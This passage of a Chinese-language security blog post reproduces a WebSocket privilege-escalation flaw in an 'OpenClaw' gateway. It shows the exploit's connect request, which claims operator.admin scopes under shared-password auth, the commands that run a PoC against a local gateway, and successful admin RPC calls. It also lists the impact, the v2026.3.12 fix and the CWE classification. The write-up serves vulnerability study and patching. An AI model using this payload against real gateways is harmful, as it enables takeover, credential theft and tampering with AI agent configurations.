<span class="string">&quot;type&quot;</span>: <span class="string">&quot;req&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;connect&quot;</span>,</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;client&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cli&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;2026.3.11&quot;</span>,</span><br><span class="line">            <span class="string">&quot;mode&quot;</span>: <span class="string">&quot;cli&quot;</span>,</span><br><span class="line">            <span class="string">&quot;platform&quot;</span>: <span class="string">&quot;linux&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;minProtocol&quot;</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">&quot;maxProtocol&quot;</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;operator&quot;</span>,</span><br><span class="line">        <span class="string">&quot;auth&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&lt;shared_password&gt;&quot;</span>  # 或 <span class="string">&quot;token&quot;</span>: <span class="string">&quot;&lt;shared_token&gt;&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;scopes&quot;</span>: [<span class="string">&quot;operator.admin&quot;</span>],  # ← 关键: 声明管理员权限</span><br><span class="line">        # device 字段省略 — 不绑定设备</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="OsbDuJijyd0QndL3UhTOwQ1MKGMNN9onaPYBqFnofuc.png" alt="image"></p>
+<h2 id="运行-PoC"><a href="#运行-PoC" class="headerlink" title="运行 PoC"></a>运行 PoC</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 安装依赖</span><br><span class="line">pip3 install websockets</span><br><span class="line"></span><br><span class="line"># 使用共享密码认证</span><br><span class="line">python3 poc.<span class="property">py</span> --target <span class="attr">ws</span>:<span class="comment">//127.0.0.1:18789 --password &lt;password&gt;</span></span><br><span class="line"></span><br><span class="line"># 使用共享令牌认证</span><br><span class="line">python3 poc.<span class="property">py</span> --target <span class="attr">ws</span>:<span class="comment">//127.0.0.1:18789 --token &lt;token&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="1ItdGgd5bdakLF_xSw-6E9dJL9QTWD_NwXTktI4xt4I.png" alt="image"></p>
+<h2 id="复现结果分析"><a href="#复现结果分析" class="headerlink" title="复现结果分析"></a>复现结果分析</h2><p><strong>认证阶段</strong>: 使用共享密码认证成功，同时声明了operator.admin 权限。</p>
+<p><strong>权限验证阶段</strong>: 成功调用了以下管理员级别 RPC 方法：</p>
+<table>
+<thead>
+<tr>
+<th>RPC 方法</th>
+<th>所需权限</th>
+<th>调用结果</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>set-heartbeats</td>
+<td>operator.admin</td>
+<td><strong>成功</strong></td>
+<td>修改网关心跳配置</td>
+</tr>
+<tr>
+<td>config.get</td>
+<td>operator.admin</td>
+<td><strong>成功</strong></td>
+<td>读取完整网关配置(2309 bytes)</td>
+</tr>
+<tr>
+<td>sessions.list</td>
+<td>operator.admin</td>
+<td><strong>成功</strong></td>
+<td>列举所有会话信息</td>
+</tr>
+</tbody></table>
+<p><img src="e5Pb7oMh--FfBUmkyuKmW3F-Aub24vGQURejrDI8050.png" alt="image"></p>
+<h1 id="攻击影响确认"><a href="#攻击影响确认" class="headerlink" title="攻击影响确认"></a>攻击影响确认</h1><p>通过此漏洞，攻击者可以：</p>
+<ol>
+<li><strong>读取完整网关配置</strong> — 包含 API 密钥、认证令牌等敏感信息</li>
+<li><strong>修改网关配置</strong> — 篡改认证设置、渠道路由等</li>
+<li><strong>管理所有会话</strong> — 列举、读取、删除用户会话</li>
+<li><strong>控制节点</strong> — 管理设备配对、节点调用</li>
+<li><strong>操作定时任务</strong> — 添加、修改、删除 cron 任务</li>
+<li><strong>修改代理行为</strong> — 更改 AI 代理的模型、提示词等配置</li>
+</ol>
+<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>OpenClaw 在 v2026.3.12 中通过以下措施修复了此漏洞：</p>
+<ol>
+<li><p><strong>移除错误的条件守卫</strong> — 删除 !sharedAuthOk 条件，使 clearUnboundScopes() 能够对所有无设备连接生效</p>
+</li>
+<li><p><strong>调整调用时序</strong> — 将权限清除移到设备身份策略评估之后，确保逻辑正确</p>
+</li>
+<li><p><strong>保留合理例外</strong> — 仅对明确允许的 Control UI 路径保留权限声明能力</p>
+</li>
+<li><p><strong>添加回归测试</strong> — 增加了针对共享令牌和共享密码两种场景的回归测试用例</p>
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>       此漏洞属于经典的授权检查缺失（CWE-862）和不当权限管理（CWE-269）问题。开发者在实现 clearUnboundScopes()函数时，错误地添加了 !sharedAuthOk条件守卫，导致通过共享令牌&#x2F;密码认证的连接完全绕过了权限清除逻辑。核心问题是<strong>信任了客户端自行声明的权限范围（scopes）</strong>，而没有在服务端根据认证方式进行严格校验。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1]<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/E1zb8_RV3oF5aEU0_Yrw4A">https://mp.weixin.qq.com/s/E1zb8_RV3oF5aEU0_Yrw4A</a></p>
+<p>[2]<a target="_blank" rel="noopener" href="https://github.com/openclaw/openclaw/security/advisories/GHSA-rqpp-rjj8-7wv8">https://github.com/openclaw/openclaw/security/advisories/GHSA-rqpp-rjj8-7wv8</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw-WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">【复现】OpenClaw WebSocket共享令牌权限提升漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="toc-number">1.1.</span> <span class="toc-text">免责声明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">漏洞代码分析与原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞所在文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%9D%83%E9%99%90%E5%A3%B0%E6%98%8E"><span class="toc-number">4.3.</span> <span class="toc-text">认证流程中的权限声明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%90%8E%E7%9A%84%E4%BB%A3%E7%A0%81%EF%BC%88v2026-3-12%EF%BC%89"><span class="toc-number">4.4.</span> <span class="toc-text">修复后的代码（v2026.3.12）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93"><span class="toc-number">4.5.</span> <span class="toc-text">漏洞原理总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-PoC"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用 PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text">关键利用代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-PoC"><span class="toc-number">5.2.</span> <span class="toc-text">运行 PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90"><span class="toc-number">5.3.</span> <span class="toc-text">复现结果分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%BD%B1%E5%93%8D%E7%A1%AE%E8%AE%A4"><span class="toc-number">6.</span> <span class="toc-text">攻击影响确认</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">7.</span> <span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">9.</span> <span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&text=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&title=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&is_video=false&description=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【复现】OpenClaw WebSocket共享令牌权限提升漏洞&body=Check out this article: https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&title=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&title=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&title=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&title=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&name=【复现】OpenClaw WebSocket共享令牌权限提升漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2025/08/13/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/&t=【复现】OpenClaw WebSocket共享令牌权限提升漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2026
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
